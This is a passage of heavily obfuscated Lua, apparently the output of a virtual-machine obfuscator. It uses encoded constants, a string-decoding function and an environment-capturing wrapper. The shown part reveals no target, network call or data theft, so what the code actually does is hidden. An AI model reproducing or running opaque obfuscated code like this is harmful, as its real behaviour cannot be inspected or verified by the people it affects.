J=-494639+4295461935 T=s*J t=Z(T)s=-658806-(-724342)Z=e[b[387184-387180]]T=Z(C)U=t+T t=391530-325994 X=nil Z=U%t T=U-Z t=T/s s=-652980+653236 T=Z%s J=Z-T s=J/D D=-145637-(-145893)J=t%D y=t-J t=nil D=y/p Z=nil y={T,s,J;D}U=nil C=nil e[b[-562609+562610]]=y D=nil T=nil s=nil J=nil end end end else if N<-787512+16264021 then if N<13901708-(-1011839)then if N<170149+14576757 then if N<13438516-(-995071)then N=y N=D and-737015+8427490 or 10266073-(-1016191)v=D else g=c(g)Y=c(Y)m=nil L=c(L)Q=c(Q)x=c(x)N=-356779+1269702 j=c(j)end else v={}N=true e[b[-135523-(-135524)]]=N N=k[O(557233+-566596)]end else if N<-479023+15801896 then N=4587244-(-30113)h=-643251-(-643252)F=m[h]u=F else I=w()q={}s=nil e[I]=q j=O(-110687-(-101347))q=w()L={}p=nil Q=w()g=O(-36383-(-27041))B=f(5383108-(-480495),{I,D;y,t})m=O(782904+-792253)t=c(t)T=nil e[q]=B B={}e[Q]=B s=35040485661957-(-631412)B=k[g]h=nil Y=e[Q]Z=nil J=nil x={[j]=Y,[m]=h}g=B(L,x)H=nil B=E(1042559-980094,{Q;I;R,D;y,q})R=c(R)C=g J=661172+10588490600401 y=c(y)I=c(I)T=O(-995803-(-986431))U=B D=c(D)t=U(T,s)v={}Q=c(Q)q=c(q)s=O(318250+-327598)Z=C[t]N=k[O(734839+-744189)]y=O(-583410+574066)t=O(-484093-(-474735))k[t]=Z T=U(s,J)t=C[T]T=O(953726+-963059)D=3288970746749-(-831610)J=O(-815033+805660)k[T]=t s=U(J,D)J=O(-907122-(-897788))T=C[s]s=O(-71971-(-62626))k[s]=T s=k[J]D=k[y]H=O(-381868+372513)q=-939581+15615904845580 R=U(H,q)p=C[R]C=nil R=O(96931+-106268)R=D[R]y={R(D,p)}U=nil J=s(G(y))s=J()end end else if N<15132326-(-1005567)then if N<16332591-700854 then N=S(585650+9229690,{Z})a={N()}v={G(a)}N=k[O(-929917+920564)]else N=e[b[657278-657268]]C=e[b[-569458+569469]]X[N]=C N=e[b[238707-238695]]C={N(X)}N=k[O(722648-732023)]v={G(C)}end else if N<17002747-426669 then N=401964+14138768 e[C]=v else a=e[C]r=a N=a and 1012159+12641250 or 101859+200230 end end end end end end end N=#l return G(v)end,function(k)local O,N=941629+-941628,k[-352043+352044]while N do X[N],O=X[N]-(-105442-(-105443)),(586611-586610)+O if X[N]==-799097-(-799097)then X[N],e[N]=nil,nil end N=k[O]end end,function(k)for O=909757-909756,#k,-706421-(-706422)do X[k[O]]=(408558-408557)+X[k[O]]end if V then local N=V(true)local G=l(N)G[O(-415721-(-406381))],G[O(-628531+619195)],G[O(-788088+778714)]=k,Z,function()return 828729-402348 end return N else return b({},{[O(-420197-(-410861))]=Z;[O(-1022523-(-1013183))]=k,[O(-660596+651222)]=function()return-405613-(-831994)end})end end,function()C=C+(842746+-842745)X[C]=547442-547441 return C end return(t(2056926-(-669045),{}))(G(v))end)(getfenv and getfenv()or _ENV,unpack or table[O(-771893-(-762552))],newproxy,setmetatable,getmetatable,select,{...})end)(...)
